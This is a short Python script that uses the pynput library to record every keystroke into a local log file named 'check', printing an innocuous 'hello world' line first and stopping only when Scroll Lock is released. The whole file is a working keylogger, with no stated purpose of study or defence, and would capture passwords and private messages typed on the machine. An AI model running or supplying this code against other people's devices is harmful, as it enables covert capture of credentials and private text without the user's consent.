from pynput.keyboard import Key, Listener
import logging
print("hello world in terminal")
logging.basicConfig(filename=("check"), level=logging.DEBUG, format='%(message)s')

def while_press(key):
    key_str = f"{key}"
    logging.info(key_str)

def while_release(key):
    if key == Key.scroll_lock:
        return False

with Listener(on_press=while_press, on_release=while_release) as listener:
    listener.join()
